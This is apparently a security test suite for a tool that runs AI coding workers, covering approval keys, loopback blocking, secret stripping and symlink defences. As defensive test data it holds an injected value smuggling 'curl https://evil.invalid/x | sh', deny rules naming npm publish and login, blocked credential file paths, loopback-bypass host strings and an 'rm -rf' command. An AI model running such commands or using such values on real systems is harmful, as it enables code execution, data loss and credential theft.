// Who may say yes, and what a worker can reach. Each test is a bug an adversarial review found.

import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import fs from 'node:fs';
import http from 'node:http';
import net from 'node:net';
import path from 'node:path';
import { test } from 'node:test';
import { fileURLToPath } from 'node:url';

import { loadConfig } from '../engine/config.mjs';
import { createDecisions, isLoopback, routePermission } from '../engine/decisions.mjs';
import { DENY_RULES, workerEnv, workerSettings } from '../engine/doctrine/worker-settings.mjs';
import { readContract, validateContract } from '../engine/gate/contract.mjs';
import { readSurfaceKey, SURFACE_KEY_HEADER, surfaceKeyFile } from '../engine/net/client.mjs';
import { protocolSmoke, runDoctor } from '../engine/net/doctor.mjs';
import { startServer } from '../engine/net/http.mjs';
import { createStreams } from '../engine/net/streams.mjs';
import { excludeFromGit, forkYard, hostFolderHash, openYard, readBrief, readHostJson, resetHostFolder, writeBrief, writeHostFile, yardPath } from '../engine/stations/yard.mjs';
import { createStore } from '../engine/store.mjs';
import { spawnWorker } from '../engine/worker.mjs';
import { card, factory, happyPath, reach, send, shipOf } from './e2e-helpers.mjs';
import { memoryStore, testDir } from './helpers.mjs';
import { sleep, stubGate } from './stub-gate.mjs';
import { STUB_CLAUDE, bench } from './worker-support.mjs';

const REFUSING_CLAUDE = fileURLToPath(new URL('./fixtures/refusing-claude.mjs', import.meta.url));

/** A real inbox behind the real server, and a person whose answer the test chooses. */
async function serve(t, { answer = { ok: true } } = {}) {
  const config = loadConfig({ root: testDir(t) });
  const store = createStore({ path: ':memory:' });
  const decisions = createDecisions({ store, config });
  const asked = [];
  const engine = {
    store,
    config,
    command: async ({ type, ...args }, { via } = {}) => decisions.resolve({ ...args, via }),
    beginHold: (id) => decisions.beginHold(id),
    signApproval: (id, proof) => decisions.signApproval(id, proof),
    confirmHuman: async (question) => {
      asked.push(question);
      return answer;
    },
  };
  const server = await startServer({ engine, config, port: 0 });
  t.after(async () => {
    await server.close();
    decisions.close();
    store.close();
  });
  const post = async (route, body, headers = {}) => {
    const response = await fetch(`${server.url}${route}`, { method: 'POST', headers: { 'content-type': 'application/json', ...headers }, body: JSON.stringify(body) });
    return { status: response.status, body: await response.json() };
  };
  const open = (tier = 3) => decisions.open({
    kind: 'publish', tier, title: 'Publish it?', plain: 'Public.', payloadHash: `h-${Math.random()}`, options: [{ id: 'approve', label: 'Yes' }, { id: 'reject', label: 'No' }],
  }).id;
  return { config, server, store, decisions, post, open, asked };
}

test('claiming to be the CLI proves nothing without the key', async (t) => {
  const { open, post, asked } = await serve(t);
  const id = open(4);
  for (const headers of [{ 'x-venezia-surface': 'cli' }, { 'x-venezia-surface': 'mcp' }, {}, { 'x-venezia-surface': 'cli', [SURFACE_KEY_HEADER]: 'a-guess' }]) {
    const result = await post(`/api/decisions/${id}/approval`, { confirm: true }, headers);
    assert.equal(result.status, 409);
    assert.equal(result.body.ok, false);
  }
  assert.deepEqual(asked, []);
});

test('a sleeping script is not a person holding the ring', async (t) => {
  const { open, post } = await serve(t);
  const id = open();
  const { body } = await post(`/api/decisions/${id}/hold`, {});
  await sleep(body.holdMs);
  const signed = await post(`/api/decisions/${id}/approval`, { holdId: body.holdId });
  assert.equal(signed.body.ok, false);
  assert.match(signed.body.error, /agent/i);
});

test('the CLI needs its key and --confirm, and then the person at the Mac', async (t) => {
  const { config, open, post, asked } = await serve(t);
  const key = readSurfaceKey(config);
  assert.match(key, /^[0-9a-f]{64}$/);
  assert.equal(fs.statSync(surfaceKeyFile(config)).mode & 0o777, 0o600);
  const headers = { 'x-venezia-surface': 'cli', [SURFACE_KEY_HEADER]: key };
  const id = open();
  const bare = await post(`/api/decisions/${id}/approval`, {}, headers);
  assert.match(bare.body.error, /--confirm/);
  const signed = await post(`/api/decisions/${id}/approval`, { confirm: true }, headers);
  assert.equal(signed.body.ok, true);
  assert.equal(asked.length, 1);
  assert.equal(asked[0].title, 'Publish it?');
});

test('a browser that finishes a hold still has to be answered on the Mac, and no means no', async (t) => {
  const { open, post, server } = await serve(t, { answer: { ok: false, error: 'You said no on this Mac.' } });
  const origin = { origin: server.url };
  const id = open();
  const { body } = await post(`/api/decisions/${id}/hold`, {}, origin);
  await sleep(body.holdMs);
  const refused = await post(`/api/decisions/${id}/approval`, { holdId: body.holdId }, origin);
  assert.equal(refused.body.ok, false);
  assert.equal(refused.body.token, undefined);
  assert.match(refused.body.error, /said no/);
});

test('a card below tier 3 asks nobody', async (t) => {
  const { open, post, asked, server } = await serve(t);
  const signed = await post(`/api/decisions/${open(2)}/approval`, {}, { origin: server.url });
  assert.equal(signed.body.ok, true);
  assert.deepEqual(asked, []);
});

test('a stray local process cannot start pairing or list devices', async (t) => {
  const { post, server } = await serve(t);
  const started = await post('/api/pair/start', {});
  assert.equal(started.status, 403);
  assert.equal(started.body.pin, undefined);
  assert.equal((await fetch(`${server.url}/api/devices`)).status, 403);
});

test('the key goes when the server does', async (t) => {
  const { config, server } = await serve(t);
  assert.ok(readSurfaceKey(config));
  await server.close();
  assert.equal(readSurfaceKey(config), undefined);
});

test('no card can open this machine to a worker', () => {
  for (const host of ['127.0.0.1', 'localhost', 'localhost:4800', '127.1.2.3', '127.1', '0.0.0.0', '::1', '[::1]', '[::1]:4800', '::ffff:127.0.0.1', '2130706433', '0x7f000001', 'x.localhost']) {
    assert.equal(isLoopback(host), true, host);
    assert.equal(routePermission({ toolName: 'SandboxNetworkAccess', input: { host } }, { cwd: '/y', allowedDomains: [] }), 'refuse', host);
  }
  assert.equal(routePermission({ toolName: 'SandboxNetworkAccess', input: { host: 'example.com' } }, { cwd: '/y', allowedDomains: [] }), 'network');
});

test('an approval token works once, on one card, from one surface', (t) => {
  const store = memoryStore(t);
  const decisions = createDecisions({ store, config: loadConfig({ root: testDir(t) }) });
  t.after(() => decisions.close());
  const payloadHash = 'same-plan';
  const open = () => decisions.open({ kind: 'publish', tier: 3, title: 'T', plain: 'P', payloadHash, options: [{ id: 'approve', label: 'Yes' }] }).id;
  const first = open();
  const second = open();
  const token = decisions.approvalToken(first, 'cli');
  assert.equal(decisions.verifyApproval(token, first, 'cli'), true);
  assert.equal(decisions.verifyApproval(token, first, 'web'), false, 'another surface');
  assert.equal(decisions.verifyApproval(token, second, 'cli'), false, 'another card with the same plan');
  assert.equal(decisions.resolve({ id: second, optionId: 'approve', token, via: 'cli' }).ok, false);
  assert.equal(decisions.resolve({ id: first, optionId: 'approve', token, via: 'cli' }).ok, true);
  const third = open();
  assert.equal(decisions.resolve({ id: third, optionId: 'approve', token, via: 'cli' }).ok, false, 'spent');
});

test('an MCP agent cannot make law, by the command or by the card', async (t) => {
  const { engine } = factory(t, { scenarios: happyPath(), options: { runGate: stubGate() } });
  await engine.start();
  const { ok, id } = engine.portolano.draft({ kind: 'hazard', text: 'Always do the risky thing.', why: 'It works.', howToApply: 'Do it.', tags: ['web'], evidence: [1] }, { shipId: null });
  assert.equal(ok, true);
  const refused = await engine.command({ type: 'lesson.promote', id }, { via: 'mcp' });
  assert.equal(refused.ok, false);
  assert.match(refused.error, /agent/i);
  const card_ = engine.decisions.open({ kind: 'lesson', tier: 0, title: 'Make this law?', plain: 'x', detail: { lessonId: id }, options: [{ id: 'law', label: 'Make it law' }, { id: 'keep', label: 'Keep' }] });
  assert.equal(engine.decisions.resolve({ id: card_.id, optionId: 'law', via: 'mcp' }).ok, false);
  assert.equal(engine.store.lessons.list().find((lesson) => lesson.id === id).status, 'candidate');
  assert.equal((await engine.command({ type: 'lesson.promote', id }, { via: 'cli' })).ok, true);
  assert.equal(engine.store.events({ types: ['lesson.promoted'] }).length, 1);
});

test('a worker inherits no secret, whatever it is called', (t) => {
  const config = loadConfig({ root: testDir(t) });
  const env = workerEnv({
    PATH: '/bin', HOME: '/h', LANG: 'C', OPENAI_API_KEY: 'x', HOMEBREW_GITHUB_API_TOKEN: 'x', NETLIFY_AUTH_TOKEN: 'x', GITLAB_TOKEN: 'x', GOOGLE_API_KEY: 'x',
    STRIPE_SECRET_KEY: 'x', npm_config__authToken: 'x', GH_PAT: 'x', DATABASE_URL: 'x', CLAUDE_CODE_X: 'x', SOMETHING_NEW_NEXT_YEAR: 'x', VENEZIA_FAKE_SCRIPT: 'kept',
  }, config);
  assert.equal(env.PATH, '/bin');
  assert.equal(env.VENEZIA_FAKE_SCRIPT, 'kept');
  for (const name of ['OPENAI_API_KEY', 'HOMEBREW_GITHUB_API_TOKEN', 'NETLIFY_AUTH_TOKEN', 'GITLAB_TOKEN', 'GOOGLE_API_KEY', 'STRIPE_SECRET_KEY', 'npm_config__authToken', 'GH_PAT', 'DATABASE_URL', 'CLAUDE_CODE_X', 'SOMETHING_NEW_NEXT_YEAR']) {
    assert.equal(env[name], undefined, name);
  }
  assert.equal(fs.readFileSync(env.npm_config_userconfig, 'utf8'), '', 'no ~/.npmrc token applies');
});

test('a worker has no way to publish to npm by name', () => {
  for (const rule of ['Bash(npm publish)', 'Bash(npm publish *)', 'Bash(npm unpublish *)', 'Bash(npm token *)', 'Bash(npm adduser)', 'Bash(npm login *)', 'Bash(pnpm publish *)', 'Bash(yarn publish *)', 'Bash(yarn npm publish *)']) {
    assert.ok(DENY_RULES.includes(rule), rule);
  }
});

test('the data folder, other yards and credentials are closed to a worker, and its own work is not', (t) => {
  const root = testDir(t);
  const config = loadConfig({ root });
  for (const dir of ['yards/mine', 'yards/other', 'data/brand-new-folder']) fs.mkdirSync(path.join(root, dir), { recursive: true });
  const { denyRead, allowWrite } = workerSettings(config, { yard: path.join(root, 'yards/mine') }).sandbox.filesystem;
  for (const name of ['net', 'publish', 'evidence', 'venezia.db', 'brand-new-folder']) assert.ok(denyRead.includes(path.join(config.dataDir, name)), name);
  for (const secret of ['~/.npmrc', '~/.netrc', '~/.git-credentials', '~/.docker']) assert.ok(denyRead.includes(secret), secret);
  assert.ok(denyRead.includes(path.join(root, 'yards/other')));
  assert.equal(denyRead.includes(path.join(root, 'yards/mine')), false);
  assert.equal(denyRead.includes(config.npmCacheDir), false, 'installs need the cache');
  assert.ok(allowWrite.includes(config.npmCacheDir));
});

test('a run has settings of its own, and they go when it does', async (t) => {
  const b = bench(t, { turns: [['done']] });
  const worker = spawnWorker(b.spec());
  const settings = b.argv?.bind(b);
  await worker.done;
  const used = settings()[settings().indexOf('--settings') + 1];
  assert.match(used, /workers\/.+\.json$/);
  assert.equal(fs.existsSync(used), false);
});

test('a daemon a tool leaves behind does not outlive the run', async (t) => {
  const script = { turns: [[{ tool: 'Bash', input: { command: "nohup sh -c 'sleep 93.41' >/dev/null 2>&1 &" } }, 'done']] };
  const b = bench(t, script);
  const worker = spawnWorker(b.spec());
  const result = await worker.done;
  assert.equal(result.outcome, 'completed');
  await sleep(50);
  const left = execFileSync('ps', ['-axo', 'command='], { encoding: 'utf8' }).split('\n').filter((line) => line.includes('sleep 93.41') && !line.includes('nohup'));
  assert.deepEqual(left, []);
});

test('a worker that goes silent is ended as crashed, and frees its slot', async (t) => {
  const b = bench(t, {}, { config: { claudeBin: STUB_CLAUDE }, env: { VENEZIA_STUB: 'stops-silently' } });
  const worker = spawnWorker(b.spec({ timing: { silenceMs: 100, silenceCheckMs: 20, killGraceMs: 50 } }));
  const result = await worker.done;
  assert.equal(result.outcome, 'crashed');
  assert.match(result.error, /said nothing/);
});

test('a worker waiting on a card is not silent', async (t) => {
  const script = { turns: [[{ tool: 'Bash', input: { command: 'rm -rf /nope' }, ask: true }, 'done']] };
  const b = bench(t, script);
  let answered = false;
  const worker = spawnWorker(b.spec({
    timing: { silenceMs: 100, silenceCheckMs: 10 },
    onPermission: async () => {
      await sleep(250);
      answered = true;
      return { behavior: 'deny', message: 'No' };
    },
  }));
  const result = await worker.done;
  assert.equal(answered, true);
  assert.notEqual(result.outcome, 'crashed');
});

test('a stalled SSE client is dropped, and the server keeps no backlog for it', async (t) => {
  const store = memoryStore(t);
  const streams = createStreams({ store });
  t.after(() => streams.close());
  let response = null;
  const server = http.createServer((request, reply) => {
    response = reply;
    streams.sse(request, reply, new URLSearchParams(''));
  });
  await new Promise((resolve) => { server.listen(0, '127.0.0.1', resolve); });
  t.after(() => server.close());
  const socket = net.connect(server.address().port, '127.0.0.1');
  t.after(() => socket.destroy());
  socket.on('error', () => {});
  socket.write('GET /sse HTTP/1.1\r\nHost: x\r\n\r\n');
  socket.pause();
  await sleep(100);
  store.append({ type: 'ship.created', shipId: 's', data: { idea: 'x' } });
  store.append({ type: 'worker.started', shipId: 's', data: { runId: 'r', role: 'marangone', model: 'sonnet' } });
  const text = 'x'.repeat(2000);
  for (let index = 0; index < 8000; index += 1) store.append({ type: 'worker.text', shipId: 's', data: { runId: 'r', text } });
  await sleep(50);
  assert.equal(response.destroyed, true);
  assert.equal(streams.counts().sse, 0);
});

test('doctor uses the flags a real worker uses, so a CLI that refuses one fails it', async (t) => {
  const config = loadConfig({ root: testDir(t), claudeBin: REFUSING_CLAUDE });
  fs.mkdirSync(config.dataDir, { recursive: true });
  const smoke = await protocolSmoke({ bin: REFUSING_CLAUDE, cwd: config.dataDir, env: process.env });
  assert.equal(smoke.ok, false);
  assert.match(smoke.error, /unknown option/);
  const report = await runDoctor({ config, env: process.env });
  assert.equal(report.checks.find((check) => check.id === 'protocol').status, 'fail');
  assert.equal(report.ok, false);
});

/* ------------------------------------------------------------- links in the yard */

function yardBench(t) {
  const root = testDir(t);
  const config = loadConfig({ root });
  fs.mkdirSync(config.yardsDir, { recursive: true });
  const shipId = 'ship-one';
  const yard = openYard(config, shipId);
  const victim = path.join(root, 'victim');
  fs.mkdirSync(path.join(victim, 'evidence'), { recursive: true });
  fs.writeFileSync(path.join(victim, 'evidence', 'precious.txt'), 'keep me');
  fs.writeFileSync(path.join(victim, 'brief.json'), '{"secret":"outside the yard"}');
  const evidenceDir = path.join(root, 'evidence-run');
  fs.mkdirSync(evidenceDir);
  fs.writeFileSync(path.join(evidenceDir, 'evidence.json'), '{}');
  return { root, config, shipId, yard, victim, evidenceDir };
}

const plantHostLink = ({ yard, victim }) => {
  fs.rmSync(path.join(yard, '.venezia'), { recursive: true, force: true });
  fs.symlinkSync(victim, path.join(yard, '.venezia'));
};

test('the host will not reset, hash or read through a linked host folder', (t) => {
  const context = yardBench(t);
  const { config, shipId, yard, victim, evidenceDir } = context;
  plantHostLink(context);
  assert.throws(() => resetHostFolder(config, shipId, evidenceDir), /link/);
  assert.equal(fs.readFileSync(path.join(victim, 'evidence', 'precious.txt'), 'utf8'), 'keep me');
  assert.throws(() => hostFolderHash(yard), /link/);
  assert.equal(readHostJson(yard, 'brief.json'), null);
  assert.throws(() => writeHostFile(yard, 'brief.json', '{}'), /link/);
});

test('the host does not write through a linked file in the host folder', (t) => {
  const { yard, victim } = yardBench(t);
  fs.symlinkSync(path.join(victim, 'brief.json'), path.join(yard, '.venezia', 'brief.json'));
  assert.throws(() => writeHostFile(yard, 'brief.json', 'overwritten'), /link/);
  assert.equal(readHostJson(yard, 'brief.json'), null);
  assert.match(fs.readFileSync(path.join(victim, 'brief.json'), 'utf8'), /outside the yard/);
});

test('the brief lives with the host, so a fork copies the host\'s bytes and never a link', (t) => {
  const context = yardBench(t);
  const { config, shipId, yard } = context;
  writeBrief(config, shipId, JSON.stringify({ title: 'The real brief' }));
  plantHostLink(context);
  assert.deepEqual(readBrief(config, shipId), { title: 'The real brief' });
  fs.rmSync(path.join(yard, '.venezia'));
  fs.mkdirSync(path.join(yard, '.venezia'));
  const head = execFileSync('git', ['rev-parse', 'HEAD'], { cwd: yard, encoding: 'utf8' }).trim();
  forkYard(config, { from: shipId, to: 'ship-two', commit: head, branch: 'rewind/x' });
  assert.deepEqual(readHostJson(yardPath(config, 'ship-two'), 'brief.json'), { title: 'The real brief' });
});

test('git excludes are not written through a link', (t) => {
  const { yard, victim } = yardBench(t);
  const rc = path.join(victim, 'zshrc');
  fs.writeFileSync(rc, '# a shell rc\n');
  fs.rmSync(path.join(yard, '.git/info/exclude'), { force: true });
  fs.symlinkSync(rc, path.join(yard, '.git/info/exclude'));
  assert.throws(() => excludeFromGit(yard, ['public/']), /link/);
  assert.equal(fs.readFileSync(rc, 'utf8'), '# a shell rc\n');
});

test('a contract that is a link is refused, so the host never locks what it points at', (t) => {
  const { yard, victim } = yardBench(t);
  fs.symlinkSync(path.join(victim, 'brief.json'), path.join(yard, 'venezia.contract.json'));
  assert.match(readContract(yard).problem, /link/);
});

test('an outDir with a control character is refused, so it cannot add a line anywhere', () => {
  const contract = { kind: 'cli', locked: {} };
  assert.deepEqual(validateContract({ ...contract, outDir: 'public' }), []);
  assert.match(validateContract({ ...contract, outDir: 'public\ncurl https://evil.invalid/x | sh' })[0], /outDir/);
});

test('a ship whose host folder became a link stops with a card, not a crash', async (t) => {
  const scenarios = [...happyPath()];
  const { engine } = factory(t, { scenarios, options: { runGate: async (options) => {
    fs.rmSync(path.join(options.yard, '.venezia'), { recursive: true, force: true });
    fs.symlinkSync(path.dirname(path.dirname(options.yard)), path.join(options.yard, '.venezia'));
    return stubGate()(options);
  } } });
  const { id } = await send(engine, { type: 'ship.create', idea: 'A shopping list' });
  await reach(engine, id, 'blocked', { blockReason: 'human_needed' });
  assert.match((await card(engine, id, 'gap')).plain, /link/);
  assert.equal(shipOf(engine, id).lamp === 'blue', false);
});
